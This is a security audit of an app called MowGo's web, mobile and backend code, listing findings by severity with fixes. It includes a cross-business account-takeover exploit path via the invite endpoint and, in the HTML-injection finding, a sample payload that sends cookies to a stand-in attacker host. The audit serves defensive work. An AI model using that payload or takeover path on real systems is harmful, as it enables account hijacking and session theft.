# MowGo Security Audit — Aug 5, 2026

**Scope:** All 3 platforms (Web React PWA, iOS SwiftUI, Android Kotlin native) + shared backend (Supabase RLS/migrations, 4 Deno edge functions, 12 Cloudflare Pages Functions, Node server).
**Method:** 3 parallel auditors (web/backend/mobile) + independent verification of every CRITICAL/HIGH against actual source. Follow-up to July 31 audit (30 findings — template-literal auth headers now VERIFIED FIXED via raw byte inspection; invite-crew 403 fixed; SW cache poisoning fixed).
**Files reviewed:** 50 client src, 12 CF functions, 21 migrations, 4 edge fns, 7 server files, 35 Swift, ~30 Kotlin. Deps scanned via npm audit.

---

## CRITICAL (1)

### C1. invite-crew.js — Cross-business account takeover (Flow 2, existing user)
**File:** `functions/api/invite-crew.js:78-149`
**What:** Any authenticated owner can call `POST /api/invite-crew` with **any existing MowGo user's email**. Flow 2 looks up the user by email and PATCHes their profile to `business_id: attackerId, role: 'crew', tier: 'crew'` — **with no check that the target isn't already an owner or member of another business.**
**Exploit path:**
1. Attacker signs up (free account = role owner).
2. Calls `/api/invite-crew` with victim's email (victim = owner of another business).
3. Victim's profile row is overwritten: business_id → attacker's id, role → crew, tier → crew.
4. Victim's RLS now computes `current_business_id()` = attacker's business → victim **loses all access to their own clients, jobs, invoices** ("Clients: owner full access" requires `auth.uid() = current_business_id()`).
5. Attacker can now read victim's profile PII (phone, business_name, avatar, fcm_token, lat/long) via the business-scoped profile read policy.
**Impact:** Cross-tenant account hijack + permanent lockout of victim from their own business data + PII exposure to attacker. One API call, no consent.
**Remediation:** Before Flow-2 PATCH, reject if target already has `business_id` set or `role = 'owner'` (i.e. only allow invite of users with no business). Add explicit ownership-transfer confirmation. Also require inviter to be on Crew tier (see H2).

---

## HIGH (3)

### H1. invite-crew.js — HTML injection into invite email
**File:** `functions/api/invite-crew.js:233`
**What:** `ownerProfile.business_name` interpolated into the Resend email HTML with **no escapeHtml** (route-audit.js and ics.js both escape; this one doesn't). business_name is user-controlled (GRANT UPDATE business_name + self-update policy).
**Exploit:** Owner sets business_name to `<img src=x onerror=fetch('//evil.com/?c='+document.cookie)>` → invite email rendered by crew invitee's mail client executes/loads attacker content from a trusted MowGo sender.
**Impact:** Email-borne injection from trusted domain; phishing + tracking + potential payload delivery in weaker mail clients.
**Remediation:** Escape business_name (port escapeHtml from route-audit.js) at line 233.

### H2. No rate limiting on invite-crew + no tier gate
**File:** `functions/api/invite-crew.js:17-251`
**What:** Unlike booking/route-audit/leads (5/15min), invite-crew has **zero rate limiting**, and the inviter check only verifies `role=owner` — **a free-tier owner can invite crew** (server-side `/api/team/invite` checks `tier==='crew'`, but the CF function doesn't).
**Impact:** Unlimited user creation + Resend emails = cost amplification + auth-quota exhaustion + spam. Plan-gate bypass (crew features without Crew plan).
**Remediation:** Rate limit per owner (e.g. 10/hour), require `tier='crew'` on inviter profile.

### H3. Webhook replay — no idempotency; deleted-event replay downgrades subscribers
**File:** `functions/api/stripe/webhook.js:9-74`
**What:** No event-id dedup. `customer.subscription.deleted` always sets tier='free'. Stripe signature prevents forgery, but a **replayed/redelivered** deleted event (Stripe retries, or an attacker who obtains the webhook secret) downgrades an active paying subscriber to free.
**Impact:** Billing state corruption; customer loses premium access while still paying.
**Remediation:** Track processed event IDs (KV or table), skip duplicates; for subscription.deleted, verify the subscription is actually canceled at Stripe before downgrading.

---

## MEDIUM (6)

### M1. Android auth tokens in PLAINTEXT SharedPreferences (auditor claim of encryption is WRONG)
**File:** `client/android-native/app/src/main/java/com/mowgo/app/data/SupabaseClient.kt:20-28` + `app/src/main/AndroidManifest.xml:9`
**What:** `install(Auth)` with no custom storage. Verified in supabase-kt 3.0.1 source (`SettingsSessionManager` → `com.russhwolf.settings.Settings` → Android **SharedPreferences, not encrypted**). Combined with `android:allowBackup="true"`.
**Exploit:** adb backup (API ≤30, or any device with USB debugging) extracts session tokens → full account takeover.
**Remediation:** Configure `EncryptedSettingsStorage`/custom Keystore-backed SessionManager; set `allowBackup="false"` or backup rules excluding prefs.

### M2. iOS Keychain accessibility too broad
**File:** `ios-native/MowGo/Services/SupabaseService.swift:193`
**What:** `kSecAttrAccessibleAfterFirstUnlock` — tokens readable while device locked after first unlock; survives backup restore.
**Remediation:** `kSecAttrAccessibleWhenUnlockedThisDeviceOnly`.

### M3. Wildcard CORS on 5 endpoints
**Files:** `functions/api/invite-crew.js:20,257`, `webhook-dispatch.js:46`, `admin/concierge.js:3`, `team/[memberId].js:13`, `concierge-submit.js:3`
**What:** `'Access-Control-Allow-Origin': origin || '*'`. Bearer auth mitigates direct CSRF, but any origin can read responses (exacerbates C1 if token ever leaks; enables abuse from attacker domains).
**Remediation:** Restrict to `['https://mowgo.pages.dev','https://mowgoapp.com']` like checkout-subscription.js.

### M4. Concierge admin: static shared code + no rate limit + sessionStorage
**Files:** `functions/api/admin/concierge.js:26`, `client/src/pages/AdminConcierge.jsx:6`
**What:** Auth = `x-admin-code === CONCIERGE_ADMIN_CODE` string compare, no rate limiting on failures, code held in sessionStorage. Endpoint lists ALL concierge requests (PII) and can import/schedule/delete jobs for any user.
**Impact:** Brute-forceable admin gate over full customer PII.
**Remediation:** Rate limit, constant-time compare, per-user admin auth, or at minimum a strong random code.

### M5. Job photos in PUBLIC storage bucket
**Files:** `client/android-native/.../JobPhotoRepository.kt:35-46` (+ iOS equivalent), no storage RLS policies in migrations
**What:** Uploads to public `job-photo` bucket at `{userId}/{jobId}/photo.jpg`. No storage.object policies found in any migration. Anyone with the URL can view job photos (client property images).
**Remediation:** Add storage RLS: `bucket_id='job-photo' and (auth.uid()::text = (storage.foldername(name))[1])` for select; verify existing bucket policy in dashboard.

### M6. send-webhook edge function broken after migration 010 (deployed, dead)
**Files:** `supabase/functions/send-webhook/index.ts:95,141` vs `migrations/010_webhook_url_rename.sql:4`
**What:** Function still selects `zapier_url` (renamed to `url`). It IS deployed (ACTIVE, v14) but nothing calls it (web client + mobile use `webhook-dispatch.js` which is correct). Any invocation 500s.
**Remediation:** Fix column refs or undeploy/delete the function (prefer delete — dead code).

---

## LOW (7)

1. **SSRF filter gaps** — `webhook-dispatch.js:30-39` misses `192.0.0.0/24`, `198.18.0.0/15`; hostname-only check (no resolve). Add CIDR completeness / resolve-then-check.
2. **estimates policy** — `012_estimates.sql:18` `FOR ALL` without explicit `WITH CHECK` (functionally safe — PG defaults USING→WITH CHECK; add for clarity).
3. **Server dead code** — `server/stripe-subscriptions.js:2` `VALID_TIERS` missing `'premium'`; `server/.env` missing `STRIPE_WEBHOOK_SECRET`. Dev-only; if ever deployed, premium breaks.
4. **In-memory rate limits per-isolate** — booking/leads/route-audit bypassable across PoPs (acknowledged in code comments). Use CF Rate Limiting rules.
5. **No cert pinning** (both mobile) — LOW given HTTPS+CT.
6. **google-services.json committed** — project identifiers public (API key redacted); move to CI injection.
7. **print()/println() in release builds** (iOS ~12 sites, Android WebhookService) — use os_log/Log with privacy levels.
8. **npm audit** — 3 high: react-router RSC-mode CSRF (N/A — no RSC used, client-only SPA), brace-expansion DoS (dev-tooling via Capacitor CLI). No exploitable runtime deps.
9. **ai-chat edge function on disk, not deployed** — dead code w/ OpenRouter key config; delete (per "AI chat removed" policy).
10. **Migration numbering collision** — two `007_*` files (007_push_notifications, 007_webhook_secrets); works (filename order) but renumber for hygiene.

---

## Functional bug found during audit (not security)

**Web invite broken:** `client/src/lib/data.js:990` calls `/api/team/invite`, but the CF function is at `/api/invite-crew` → web UI invites 404. iOS (`DataStore.swift:1823`) and Android (`TeamRepository.kt:70`) correctly call `/api/invite-crew` (hardcoded to `mowgo.pages.dev` — should be `mowgoapp.com`). Web invite path needs pointing at the right route.

---

## Verified solid (no action)

- ✅ RLS comprehensive across all tables; `current_business_id()` SECURITY DEFINER + REVOKE/GRANT correct; tenant isolation sound (except C1).
- ✅ Template-literal auth headers FIXED (raw bytes: `` `Bearer ${token}` `` everywhere).
- ✅ Stripe webhook HMAC-SHA256 + 5-min tolerance + no-answer oracle; Twilio HMAC-SHA1 constant-time.
- ✅ Checkout: JWT verified server-side, price IDs from env, no client amounts; confirm-payment verifies amount+metadata against Stripe.
- ✅ No secrets in git (007 generates random secrets; .env ignored, never in history).
- ✅ iOS Keychain w/ UserDefaults migration cleanup; no WebView; minimal exported components; ATS clean; cleartext blocked on Android.
- ✅ No XSS (zero dangerouslySetInnerHTML); no open redirects; CSRF mitigated by Bearer.

---

**Totals:** 1 CRITICAL · 3 HIGH · 6 MEDIUM · 10 LOW · 1 functional bug
**Biggest lever:** C1 — one-line guard (reject invite if target already has a business) closes the account-takeover path.
